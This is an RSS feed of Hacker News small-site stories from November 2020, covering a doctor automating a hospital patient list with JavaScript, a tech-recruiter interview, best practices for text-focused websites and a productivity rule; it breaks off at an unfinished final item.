<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Fri, 27 Nov 2020 01:01:28 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Fri, 27 Nov 2020 01:01:28 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[I wrote a script in 4 hours that will save my hospital $40k every year]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25207590">thread link</a>) | @joshcase
<br/>
November 25, 2020 | https://joshcase.dev/articles/i-wrote-a-script-in-4-hours-that-will-save-my-hospital-40k-every-year | <a href="https://web.archive.org/web/*/https://joshcase.dev/articles/i-wrote-a-script-in-4-hours-that-will-save-my-hospital-40k-every-year">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

            <div>
                    <div>
        
        <h2>An example of JavaScript automation at work in medicine</h2>

        
            <p><img src="https://joshcase.dev/img/articles/script-in-4-hours/notepad-pathology-js.png"></p><p>
    	I'm not sure if you've ever tried to write an app in Notepad - but I <b>really</b> don't recommend it. Although, when inspiration strikes, you've got to make do with the tools you've got in front of you.
    </p>

    <p>
    	You can view the the <b>pathology.js</b> script repository in its entirety on <a href="https://github.com/joshcase/pathology.js/blob/master/pathology.js">GitHub</a>.
    </p>

    <p>
    	If you're often frustrated with the volume of <i>"copy and paste"</i> or simple data entry required to complete a task at your workplace or elsewhere, you're probably looking at a problem that could be solved with <b>automation</b>.
    </p>

    <p>
    	<b>Automation</b> refers to using computer programs to handle tedious or repetitive tasks, freeing up humans for more meaningful work.
    </p>

    <p>
    	I recently found myself in such a situation when I joined a general surgery unit at a hospital in Australia. The unit employs 4-6 junior doctors to start work up to 60 minutes before everyone else does, purely to manually update a list of patients under their care, along with their current management plans and pathology results.
    </p>

    <p>
    	 The idea is that all the clinical information is collated into a portable, easy-to-read format for the senior decision makers to digest. This document is affectionately known as <b>The Listâ„¢</b>. Here's a de-identified example of what I mean:
    </p>

    <p><img src="https://joshcase.dev/img/articles/script-in-4-hours/list.png"></p><p>
    	Once the information is organised in this way, it provides a convenient overview of the unit and the patients under our care. The problem is that creating <b>The Listâ„¢</b> is a tedious and time-consuming task that virtually all of the junior doctors I know dread. On a weekend, there might be <b>40 patients</b> on <b>The Listâ„¢</b>, all of whom need their blood tests from the last 24 hours manually entered into the correct table - all before you start work! Ouch.
    </p>

    <p>
    	Above all, it makes the job less enjoyable, and is probably a contributor to clinician burnout, as most of the clinicians I know signed up to see and treat patients rather than to fill out spreadsheets.
    </p>

    <p>
    	Unfortunately, most hospitals in Australia and indeed the world hold their information in independent silos that aren't integrated. As a result there's a huge administrative overhead associated with checking multiple sources of information and centralising it.
    </p>

    <p>
    	In this case specifically, there are typically 5 junior doctors each weekday spending anywhere from 15 minutes to 1 hour preparing <b>The Listâ„¢</b>. Opening our patient information system, copying patient details, cross-checking that with our pathology system, copying across the new information - <i>ad nauseam</i>.
    </p>

    <p>
    	For simplicity's sake, let's say there's 5 doctors spending 30 minutes every week day doing this, as well as 1 doctor spending 1.5 hours each day of the weekend.
    </p>

    <p>
    	Assuming we're paying the doctors at overtime rates ($50 per hour), we can cost the labour used for this task annually as follows:
    </p>

    <p>
        Annual Cost ($AUD) = 50 * (5 * 5 * 0.5 + 2 * 1.5) * 52
    </p>

    <p>
    	Which gives us a grand total of <b>$40,300</b> annually. That's a truckload of public cash!
    </p>

    <p>
    	But given this task is highly repetitive and data-entry focused, could we try and automate it?
    </p>

    <p>
    	<i>Yes. Yes we can.</i>
    </p>

    <p>
    	Being the lazy, bratty and entitled millenial I am, after working this job for less than one week, I knew there had to be a better way.
    </p>

    <p>
    	I initially hoped to open a dialogue with the hospital IT department to allow me to deploy a Python application to handle this task for us, but I quickly realised that this route would likely take 6 months of emailing alone before they'd even consider letting me start experimenting with the problem at hand.
    </p>

    <p>
    	Furthermore, maintaining a Python environment on any of the computers where I wanted the script to run would be an absolute headache. So Python seems to be a no-go.
    </p>

    <p>
    	It wasn't until I realised (mid shift, I might add) that I didn't need executable rights to solve this problem at all.
    </p>

    <p>
    	I immediately took my lunch break and fired up <b>*Notepad*</b> of all apps to start throwing together the solution. Desperate times call for desperate measures.
    </p>

    <p>
    	The hospital I'm referring to uses a program called the <b>The Viewer</b> in an attempt to centralise all the information from the different silos I mentioned above. The Viewer is a browser-based web application that asynchronously loads information about a given patient and their admission through hospital.
    </p>

    <p>
    	<i>Because I take patient privacy really seriously and because I'm quite paranoid about accidentally leaking patient data, I've decided not to include a screenshot of The Viewer.</i>
    </p>

    <p>
    	When you open a patient on The Viewer, it first opens a blank web page, and then subsequently sends additional web requests to each of the information silos to get information about the patient - what their recent blood tests have been, what their recent scans have shown, when their outpatient appointments are <i>et cetera</i>. It then populates this initially blank web page with the information it received from the web requests to each of the respective silos.
    </p>

    <p>
    	Any time you open a webpage, depending on which browser you're running, you can right click on the page, click <b>Inspect</b> to open a special menu, and then look for some variation of the <b>Network</b> tab. This essentially allows you to view all the web traffic that is coming to and from the page you've got open.
    </p>

    <p>
    	Here's an example of the Network tab for <i>joshcase.dev</i>:
    </p>

    <p><img src="https://joshcase.dev/img/articles/script-in-4-hours/network-tab.png"></p><p>
    	It's fairly messy to the untrained eye, but you can certainly see a few familiar things: requests to load images like <i>josh-case.png</i> (the portrait for the website footer), to load <i>main.css</i> (the file that has all the webpage structure/decoration information in it) as well as files like <i>list.png</i> that constitute the other pictures in the article.
    </p>

    <p>
    	By refreshing the web page a few times and by poking around, I eventually realised The Viewer was leveraging a script called <b>GetCompletedContent</b> to load the information from each of the information silos.
    </p>

    <p>
    	What's more, when you click on a specific web request in the Network tab, you can see which parameters were sent with the request, essentially allowing you to understand what sort of structure the server is expecting:
    </p>

    <p><img src="https://joshcase.dev/img/articles/script-in-4-hours/network-parameters.png"></p><p>
    	Again, this image isn't from The Viewer, it's also from a <i>joshcase.dev</i> request relating to MailChimp, but you can still see the Query String Parameters that represent the type of data the corresponding server is expecting.
    </p>

    <p>
    	Working this out enabled me to reverse-engineer The Viewer pathology API to poll the hospital servers for specific patient information using JavaScript. I could leverage the knowledge of the <b>GetCompletedContent</b> request and the structure it uses to request pathology information, to automatically pull the information for a given patient.
    </p>

    <p>
    	All I had to do was send a similar request to <b>The Viewer</b> servers in the way <b>GetCompletedContent</b> did:
    </p>

    <p><img src="https://joshcase.dev/img/articles/script-in-4-hours/pathology-request.png"></p><p>
    	And the beauty of using JavaScript to attack this problem is that it will run on any hospital machine at any time - as every modern browser will interpret and run JavaScript.
    </p>

    <p>
    	If you're new around here and don't believe me, right click on this webpage (anywhere) and click <b>Inspect</b>. Look for and click on the <b>Console</b> tab. Copy the following code, and paste it into the console text box:
    </p>

    <p>
        alert("JavaScript will run anywhere.");
    </p>

    <p>
    	And then hit enter. Awesome, right?!
    </p>

    <p>
    	Once I'd written the script to emulate the <b>GetCompletedContent</b> request for the blood test silo, there were a few other implementation details to iron out, (such as parsing the response information and compiling it nicely into a readable table) but the lion's share of the detective work had been done.
    </p>

    <p>
    	A job that once took 5 people 45 minutes to complete now takes 1 person 10 minutes.
    </p>

    <p>
    	That's poised to save the hospital $400,000 over the next 10 years!
    </p>

    <p>
    	 Isn't technology awesome?
    </p>

    <p>
    	If you like stories about technology and medicine, be sure to follow me on <a href="https://twitter.com/_JoshCase">Twitter</a>.
    </p>


        <p>________________</p>        
        

    </div>
            </div>

        </div></div>]]>
            </description>
            <link>https://joshcase.dev/articles/i-wrote-a-script-in-4-hours-that-will-save-my-hospital-40k-every-year</link>
            <guid isPermaLink="false">hacker-news-small-sites-25207590</guid>
            <pubDate>Wed, 25 Nov 2020 10:01:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Asking a Tech Recruiter]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25207447">thread link</a>) | @lawik
<br/>
November 25, 2020 | https://underjord.io/asking-a-tech-recruiter.html | <a href="https://web.archive.org/web/*/https://underjord.io/asking-a-tech-recruiter.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <small>2020-11-25</small>
        <p>Since I left my comfy job as the tech lead for a SaaS product and went into running my own business I took a closer look at my relationship with recruiters. While working I mostly found the attention of recruiters slightly reassuring but often annoying. I think that annoyance is fairly common, usually built up from countless LinkedIn drive-by attempts from unreading keyword-hunting recruiters. I thought that now, out on my own, maybe this legion of recruiters can be my sales department. And they have been, to an extent.</p>
<p>During my first few days as a free agent I did reach out to one recruiter in particular. This was the one that had been closest to dislodging me from my previous position and I had a feeling he was a sharp one. I had also thrown my cousin at him and he had helped him land his first real ops gig. When I got in touch this recruiter quite swiftly landed me my first client. In parallel I started to accept more recruiter connections and had a lot more conversations with assorted recruitment agencies. It has netted a fair bit of work. But I dare say the hit-rate is mostly low.</p>
<p>The recruiters that I’ve found to give the best results also give recurring results. They are the people that follow up, consider your needs, balance them with client needs and make things happen. It is my feeling that there remains a large cultural gap between the majority of recruiters and developers. I’ve been thinking about how to usefully bridge that. I don’t particularly need it right now but I want to help junior developers find their way into work and more experienced developers find their way to what they actually want. I think recruiters could help there. But I think we’re still quite far off from that.</p>
<p>I reached out  about this to my network on LinkedIn (where the recruiters live). I got a response from Emy Wennerberg Kristoffersson who was willing to take a chance and reach some new developers. Emy works mostly in Sweden around Gothenburg and Helsingborg, so while she might not work in your particular area I think the information and exchange is widely applicable. We figured a good first step is to tackle some of the common skepticisms that developers tend to have around recruiters and recruitment. I hope this will be helpful. The post is not sponsored, I asked her to answer a bunch of uncomfortable and nuanced questions which I think she does gracefully. Let’s get into it.</p>
<p><strong>For some background, can you introduce yourself and tell us a little bit about your professional experience?</strong></p>
<p>Emy: My name is Emy Wennerberg Kristoffersson. I was born and raised in Helsingborg (south of Sweden), but moved to Gothenburg back in 2016. I am passionate about tech, human beings and business development. I settled on tech-recruitment because it gives me the opportunity to combine all of these areas. For the last three years, I have been working in the recruitment industry. I work for Bonsai Consulting, a Gothenburg-based company that specializes in tech recruitment.</p>
<p>I have always had a huge tech-interest. Though, this wasn’t something that I seized back in my younger years, at least not to a greater extent (apart from when loved ones encountered technical problems and I wanted to impress – hah!). My father has always been in the IT sector so I’m quite sure that his tech skills have influenced me. I am a people-person at heart, so I eventually decided to study Human Resources in Gothenburg. In time, I got in touch with Bonsai Consulting whereupon I started to work as a researcher, and my main task was to build a network of candidates who were open to new opportunities. After a couple of months, I leveled up to a position as a recruiter and got a bigger responsibility within the company. Back then we worked broadly in recruitment and recruited to many different industries, but due to my tech-interest, the positions that related to IT and tech always ended up on my desk. One and a half years ago, we decided to work exclusively with tech recruitment due to the enormous demand within the industry.</p>
<p>One of the most interesting things in my profession is the potential for improvement in the recruitment industry. Today, I am aware that there is a lot of frustration against the recruitment profession and I do think that this is a misconception. Many jobseekers consider recruiters as an annoying part of the job search. Generally speaking, we have a pretty bad reputation (let’s talk more about this later). But the thing is, in fact, that we are an asset in a candidate’s job search and in a company’s recruiting process. My vision is to get fewer people out there to see us as an annoying piece of the puzzle, and instead see the value of taking our help as a job coach.</p>
<p><strong>Finding and hiring experienced developers has been a challenging proposition for a while due simply to enormous demand, how does this affect your job?</strong></p>
<p>Emy: The first thing that comes to my mind, is the challenge of getting the companies to understand the market and the developers’ situation. It is a bitter pill to swallow for many recruiters and companies, but today many developers have at least 4-5 opportunities available for him or her. Unfortunately, not all companies understand how coveted many developers are, and therefore they don’t understand the necessity of offering a great deal to potential employees. Not just the salary has been rising during the last years, other requirements have changed considerably as well. Today, many developers expect to be able to work remotely, having flexibility in their working day, good opportunities to develop within the company and to be able to develop their own skills (and so on…). Outstanding developers know their value on the market, and if a company’s position doesn’t sound interesting or profitable, they will go on to their next available opportunity. Many companies lack the understanding of how many offers a developer can have on their table and are therefore unable (or even unwilling) to match their needs. This is a tough nut to crack.</p>
<p>Another thing that comes top of mind is the art of standing out as a recruiter. Due to the enormous demand, many developers are likely to get contacted by a countless number of recruiters every day. The old-fashioned way of sending an email to a developer saying “Hi, here’s a job I’d like you to consider” doesn’t work today. Why? Because that developer has probably received multiple requests from other recruiters already, and my message is likely to disappear somewhere in all that noise. Over the years that I have worked as a recruiter, I have come to understand the importance of understanding the developers needs and desires before sending them multiple job descriptions, preferably even before I contact him or her. It is my duty, as a recruiter, to do my research before I expect a developer to take his or her time to talk with me. For example, If I check their Github I may find out that this developer prefers back-end development in C#/.Net, then I know that it won’t be necessary for me to contact him or her in order to talk about a front-end position where your main focus is in React and Typescript. If I don’t do my research, I’m likely to waste the person’s time. If I don’t find anything on Github or similar, then I think it is pure decency of me to first of all ask if they are interested in having a conversation with me and if they are, I can’t just throw a job description in their face without first understanding what this person is interested in.</p>
<p><strong>Has everything changed with the pandemic? Is development work hard to find now?</strong></p>
<p>Emy: A lot has changed with the pandemic. From my experience, I think that the biggest challenge for recruiters right now is that developers in general are unwilling to take on a new job, even though they might know that their current position isn’t exactly what they want. I think it’s a result of the uncertainty with the pandemic, that no one knows how it will develop and what will happen next. Since the pandemic seriously shook the market during spring and summer, many developers are worried that it will put them in a situation where they’ve left a permanent employment and the safety that it entails, to be the “last man/woman in, first out”.</p>
<p>In the beginning of the pandemic the market was disastrous, from March until September it was clear that even the IT-industry (despite the great demand) suffered from the pandemic. Many start-ups had to end their businesses and bigger companies were prohibited from hiring, many were even forced to dismiss employees in order to survive. Since August until today it has eased, and more companies dare to hire today. With that said though, companies take precautions when hiring and the processes might include more steps than normally in order to be really sure that it’s a good fit for the position.</p>
<p>I’d say that there are many opportunities on the market by now, but of course we are far from “normal”. Unfortunately, many companies demand more senior developers today, in order to fill the positions that they dismissed during spring. So, for junior developers it may still be a challenge to find their first or next position. Many companies can hire junior developers as a short-term consultant-assignment, so it is advantageous to be open to these opportunities as a junior developer.</p>
<p><strong>Is the poor reputation of the recruitment profession in tech among developers deserved or overstated?</strong></p>
<p>Emy: Sadly, I do think that it is deserved. I think that many recruiters have the wrong approach when recruiting for developer-positions. I have talked to many, many, many developers about this, and my understanding of the situation is that developers experience that recruiters don’t understand them nor their industry. And above all, many developers think that recruiters are a bit ignorant and uninterested in understanding it.</p>
<p>Recruiters and developers communicate differently, which is natural due to very different professions. …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://underjord.io/asking-a-tech-recruiter.html">https://underjord.io/asking-a-tech-recruiter.html</a></em></p>]]>
            </description>
            <link>https://underjord.io/asking-a-tech-recruiter.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25207447</guid>
            <pubDate>Wed, 25 Nov 2020 09:36:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Prime Number Shitting Bear]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25207219">thread link</a>) | @velmu
<br/>
November 25, 2020 | https://alpha61.com/primenumbershittingbear/ | <a href="https://web.archive.org/web/*/https://alpha61.com/primenumbershittingbear/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
  <p>"I'm only human, Harry."<br>
	<i>- Jim Carrey as "Lloyd Christmas" in Dumb and Dumber</i></p>

  </div></div>]]>
            </description>
            <link>https://alpha61.com/primenumbershittingbear/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25207219</guid>
            <pubDate>Wed, 25 Nov 2020 08:54:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An opinionated list of best practices for textual websites]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25207055">thread link</a>) | @dijit
<br/>
November 25, 2020 | https://seirdy.one/2020/11/23/website-best-practices.html | <a href="https://web.archive.org/web/*/https://seirdy.one/2020/11/23/website-best-practices.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	<p><em>The following applies to minimal websites that focus primarily on text. It does not
apply to websites that have a lot of non-textual content. It also does not apply to
websites that focus more on generating revenue or pleasing investors than being good
websites.</em></p>
<p>This is a “living document” that I add to as I receive feedback. See the
<a href="https://git.sr.ht/~seirdy/seirdy.one/log/master/content/posts/website-best-practices.md">changelog</a>.</p>
<p>I realize not everybody’s going to ditch the Web and switch to Gemini or Gopher today
(that’ll take, like, a month at the longest). Until that happens, here’s a
non-exhaustive, highly-opinionated list of best practices for websites that focus
primarily on text:</p>
<ul>
<li>Final page weight under 50kb without images, and under 200kb with images.</li>
<li>Works in Lynx, w3m, links (both graphics and text mode), Netsurf, and Dillo</li>
<li>Works with popular article-extractors (e.g.&nbsp;Readability) and HTML-to-Markdown
converters. This is a good way to verify that your site uses simple HTML and works
with most non-browser article readers (e.g.&nbsp;ebook converters, PDF exports).</li>
<li>No scripts or interactivity (preferably enforced at the CSP level)</li>
<li>No cookies</li>
<li>No animations</li>
<li>No fonts–local or remote–besides <code>sans-serif</code> and <code>monospace</code>. More on this
below.</li>
<li>No referrers</li>
<li>No requests after the page finishes loading</li>
<li>No 3rd-party resources (preferably enforced at the CSP level)</li>
<li>No lazy loading (more on this below)</li>
<li>No custom colors OR explicitly set the both foreground and background colors. More
on this below.</li>
<li>A maximum line length for readability</li>
<li>Server configured to support compression (gzip, optionally zstd as well). It’s a
free speed boost.</li>
<li>Supports dark mode via a CSS media feature and/or works with most “dark mode”
browser addons. More on this below.</li>
<li>A good score on Mozilla’s <a href="https://observatory.mozilla.org/">HTTP Observatory</a></li>
<li>Optimized images.</li>
<li>Maybe HTTP/2. There are some cases in which HTTP/2 can make things slower. Run some
tests to find out.</li>
</ul>
<p>I’d like to re-iterate yet another time that this only applies to websites that
primarily focus on text. If graphics, interactivity, etc. are an important part of
your website, less (possibly none) of this article applies.</p>
<p>Earlier revisions of this post generated some responses I thought I should address
below. Special thanks to the IRC and <a href="https://lobste.rs/s/akcw1m">Lobsters</a> users who
gave good feedback!</p>
<h2 id="about-fonts">About fonts</h2>
<p>If you <em>really</em> want, you could use <code>serif</code> instead of <code>sans-serif</code>, but serif fonts
tend to look worse on low-res monitors. Not every screen’s DPI has three digits.</p>
<p>To ship custom fonts is to assert that branding is more important than user choice.
That might very well be a reasonable thing to do; branding isn’t evil! It isn’t
<em>usually</em> the case for textual websites, though. Beyond basic layout and optionally
supporting dark mode, authors generally shouldn’t dictate the presentation of their
websites; that is the job of the user agent. Most websites are not important enough
to look completely different from the rest of the user’s system.</p>
<p>A personal example: I set my preferred fonts in my computer’s fontconfig settings.
Now every website that uses <code>sans-serif</code> will have my preferred font. Sites with
<code>sans-serif</code> blend into the users' systems instead of sticking out.</p>
<h3 id="but-most-users-dont-change-their-fonts">But most users don’t change their fonts…</h3>
<p>The “users don’t know better and need us to make decisions for them” mindset isn’t
without merits; however, in my opinion, it’s overused. Using system fonts doesn’t
make your website harder to use, but it does make it smaller and stick out less to
the subset of users who care enough about fonts to change them. This argument isn’t
about making software easier for non-technical users; it’s about branding by
asserting a personal preference.</p>
<h3 id="cant-users-globally-override-stylesheets-instead">Can’t users globally override stylesheets instead?</h3>
<p>It’s not a good idea to require users to automatically override website stylesheets.
Doing so would break websites that use fonts such as Font Awesome to display vector
icons. We shouldn’t have these users constantly battle with websites the same way
that many adblocking/script-blocking users (myself included) already do when there’s
a better option.</p>
<p>That being said, many users <em>do</em> actually override stylesheets. We shouldn’t
<em>require</em> them to do so, but we should keep our pages from breaking in case they do.
Pages following this article’s advice will probably work perfectly well in these
cases without any extra effort.</p>
<h3 id="but-wouldnt-that-allow-a-website-to-fingerprint-with-fonts">But wouldn’t that allow a website to fingerprint with fonts?</h3>
<p>I don’t know much about fingerprinting, except that you can’t do font enumeration
without JavaScript. Since text-based websites that follow these best-practices don’t
send requests after the page loads and have no scripts, fingerprinting via font
enumeration is a non-issue on those sites.</p>
<p>Other websites can still fingerprint via font enumeration using JavaScript. They
don’t need to stop at seeing what sans-serif maps to; they can see all the available
fonts on a user’s system, the user’s canvas fingerprint, window dimensions, etc. Some
of these can be mitigated with Firefox’s <code>privacy.resistFingerprinting</code> setting, but
that setting also understandably overrides user font preferences.</p>
<p>Ultimately, surveillance self-defense on the web is an arms race full of trade-offs.
If you want both privacy and customizability, the web is not the place to look; try
Gemini or Gopher instead.</p>
<h2 id="about-lazy-loading">About lazy loading</h2>
<p>For users on slow connections, lazy loading is often frustrating. I think I can speak
for some of these users: mobile data near my home has a number of “dead zones” with
abysmal download speeds, and my home’s Wi-Fi repeater setup occasionally results in
packet loss rates above 60% (!!).</p>
<p>Users on poor connections have better things to do than idly wait for pages to load.
They might open multiple links in background tabs to wait for them all to load at
once, or switch to another window/app and come back when loading finishes. They might
also open links while on a good connection before switching to a poor connection; I
know that I often open 10-20 links on Wi-Fi before going out for a walk in a
mobile-data dead-zone.</p>
<p>Unfortunately, pages with lazy loading don’t finish loading off-screen images in the
background. To load this content ahead of time, users need to switch to the loading
page and slowly scroll to the bottom to ensure that all the important content appears
on-screen and starts loading. Website owners shouldn’t expect users to have to jump
through these ridiculous hoops.</p>
<h3 id="wouldnt-this-be-solved-by-combining-lazy-loading-with-pre-loadingpre-fetching">Wouldn’t this be solved by combining lazy loading with pre-loading/pre-fetching?</h3>
<p>A large number of users with poor connections also have capped data, and would prefer
that pages don’t decide to predictively load content ahead-of-time for them. Some go
so far as to disable this behavior to avoid data overages. Savvy privacy-conscious
users also generally disable pre-loading because they don’t have reason to trust that
linked content doesn’t practice dark patterns like tracking without consent.</p>
<p>Users who click a link <em>choose</em> to load a full page. Loading pages that a user hasn’t
clicked on is making a choice for that user.</p>
<h3 id="cant-users-on-poor-connections-disable-images">Can’t users on poor connections disable images?</h3>
<p>I have two responses:</p>
<ol>
<li>If an image isn’t essential, you shouldn’t include it inline.</li>
<li>Yes, users could disable images. That’s <em>their</em> choice. If your page uses lazy
loading, you’ve effectively (and probably unintentionally) made that choice for a
large number of users.</li>
</ol>
<h2 id="about-custom-colors">About custom colors</h2>
<p>Some users' browsers set default page colors that aren’t black-on-white. For
instance, Linux users who enable GTK style overrides might default to having white
text on a dark background. Websites that explicitly set foreground colors but leave
the default background color (or vice-versa) end up being difficult to read. Here’s
an example:</p>
<picture>
<source srcset="https://seirdy.one/misc/website_colors.webp" type="image/webp">
<img src="https://seirdy.one/misc/website_colors.png" alt="This page with a grey background, a header with unreadable black/grey text, and unreadable white-on-white code snippets">
</picture>
<p>If you do explicitly set colors, please also include a dark theme using a media
query: <code>@media (prefers-color-scheme: dark)</code>. For more info, read the relevant docs
<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@media/prefers-color-scheme">on
MDN</a></p>
<h2 id="image-optimization">Image optimization</h2>
<p>Some image optimization tools I use:</p>
<ul>
<li><a href="http://pngquant.org/">pngquant</a> (lossy)</li>
<li><a href="https://github.com/shssoichiro/oxipng">Oxipng</a> (lossless)</li>
<li><a href="https://github.com/tjko/jpegoptim">jpegoptim</a> (lossless or lossy)</li>
<li><a href="https://developers.google.com/speed/webp/docs/cwebp">cwebp</a> (lossless or lossy)</li>
</ul>
<p>I put together a <a href="https://git.sr.ht/~seirdy/dotfiles/tree/3b722a843f3945a1bdf98672e09786f0213ec6f6/Executables/shell-scripts/bin/optimize-image">quick
script</a>
to losslessly optimize images using these programs in my dotfile repo.</p>
<p>You also might want to use the HTML <code>&lt;picture&gt;</code> element, using JPEG/PNG as a fallback
for more efficient formats such as WebP or AVIF. More info in the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture">MDN
docs</a></p>
<p>Most of my images will probably be screenshots that start as PNGs. My typical flow:</p>
<ol>
<li>Lossy compression with <code>pngquant</code></li>
<li>Losslessly optimize the result with <code>oxipng</code> and its Zopfli backend (slow)</li>
<li>Also create a lossless WebP from the lossy PNG, using <code>cwebp</code></li>
<li>Include the resulting WebP in the page, with a fallback to the PNG using a <code>&lt;picture&gt;</code> element.</li>
</ol>
<p>It might seem odd to create a lossless WebP from a lossy PNG, but I’ve found that it’s the best way to get the smallest possible image at the minimum acceptable quality for screenshots with solid backgrounds.</p>
<h2 id="other-places-to-check-out">Other places to check out</h2>
<p>The <a href="https://250kb.club/">250kb club</a> gathers websites at or under 250kb, and also
rewards websites that have a high ratio of content size to total size.</p>
<p>Also see <a href="https://motherfuckingwebsite.com/">Motherfucking Website</a>. Motherfucking
Website inspired several unofficial sequels that tried to gently improve upon it. My
favorite is <a href="https://bestmotherfucking.website/">Best Motherfucking Website</a>.</p>
</article></div>]]>
            </description>
            <link>https://seirdy.one/2020/11/23/website-best-practices.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25207055</guid>
            <pubDate>Wed, 25 Nov 2020 08:24:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tihs sbmcraeld txet is rdalebae. Did Cagmdirbe rrhaerceses rlleay dscivoer it?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25206928">thread link</a>) | @sebmellen
<br/>
November 25, 2020 | https://www.douglastwitchell.com/scrambled_words.php | <a href="https://web.archive.org/web/*/https://www.douglastwitchell.com/scrambled_words.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.douglastwitchell.com/scrambled_words.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-25206928</guid>
            <pubDate>Wed, 25 Nov 2020 08:03:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Soy Rule – A Productivity Strategy That Takes Care of Your Time]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25206785">thread link</a>) | @iuliangulea
<br/>
November 24, 2020 | https://iuliangulea.com/the-soy-rule/ | <a href="https://web.archive.org/web/*/https://iuliangulea.com/the-soy-rule/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://iuliangulea.com/images/soy-rule-cover.png" alt="The SOY Rule cover"></p><p>How many times have you found yourself overwhelmed by the number of commitments you said “yes” to previously? Maybe you even wished you didn’t take some opportunities in the first place. Not because it is not worth doing or is not attractive, but because you don’t have enough time to dedicate to it and thus you have to allocate time from other activities, and that hurts those commitments?</p><h2 id="the-problem">The Problem</h2><p>There is an ever-increasing amount of possibilities and opportunities, but you have to put in time and effort to benefit from them.</p><p>That is not really a problem in itself—the problem comes when you analyze and decide whether to take on the next opportunity that came your way or not.</p><p>The thing is—we are terrible at estimating work as we often underestimate the time needed to perform a task or work on a project. This behavior even has its own name and is called the <a href="https://en.wikipedia.org/wiki/Planning_fallacy">Planning Fallacy</a>:</p><blockquote><p>The <strong>planning fallacy</strong> is a phenomenon in which predictions about how much time will be needed to complete a future task display an optimism bias and underestimate the time needed. This phenomenon sometimes occurs regardless of the individual’s knowledge that past tasks of a similar nature have taken longer to complete than generally planned.</p></blockquote><p>But this is only part of the problem. Another aspect is that whenever we are presented with an opportunity that we like, our enthusiasm and the rewards we anticipate to obtain (both material and psychological) can play against us.</p><p>It is very easy to imagine you at the end of that journey, but you have very little information to be able to imagine yourself along its entire way. That’s why you have to gather as much information as possible and consider the effort you will have to put into it carefully.</p><h2 id="the-solution">The Solution</h2><p>The best way to resolve a problem is to anticipate it. Thus, to avoid such situations in which you find yourself overwhelmed, it makes sense to limit the number of projects you can involve in at any given time.</p><p>Now, I totally understand that any opportunity has its benefits, and I am not advocating here to turn all of them down. But you must have enough time and energy for the currently ongoing things in your life as well as some personal time in which you can do whatever it takes to recharge your batteries and take care of your body and mind.</p><p>Therefore, I came up with a rule that helps me tame my sometimes excessive proactivity and readiness to take on more projects (this is one of my <a href="https://iuliangulea.com/productivity/">favorite productivity strategies</a>. I call it <strong>The SOY (Stop Overwhelming Yourself) Rule</strong> and it is extremely simple, yet it proved itself many times over the years:</p><blockquote><p>You can have at most three projects you can work on at the same time.</p></blockquote><p>And here, a “project” is any commitment that requires your involvement of at least 2 hours a day for at least one week.</p><p>Thus, whenever someone comes up to you with the next great idea and asks whether you are willing to join and contribute, think of what you have currently going on in your life. For instance, if you have a job, write a blog, and try to work on a project of your own, you will probably not have enough time and energy for the new project, regardless of how much you like it.</p><p>In such cases, you must have a clear understanding of what is expected from you and what the project requirements are. Then, it helps to take some time to process and weigh in all the Pros and Cons. And then, you have to either say “no” to the opportunity or put some of your current projects on hold.</p><p>One essential thing to mention is that the SOY Rule is a long term strategy. Yes, you can take on more than three projects once in a while if you know you’ll be done with one of them in less than a month. But in the long term, if you keep it over a period longer than several weeks, your performance will suffer.</p><p>If you liked this article, consider subscribing below and following me on twitter (<a href="https://twitter.com/iuliangulea">@iuliangulea</a>).</p><hr></div></div>]]>
            </description>
            <link>https://iuliangulea.com/the-soy-rule/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25206785</guid>
            <pubDate>Wed, 25 Nov 2020 07:34:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to get lots of ideas for side projects and writing]]>
            </title>
            <description>
<![CDATA[
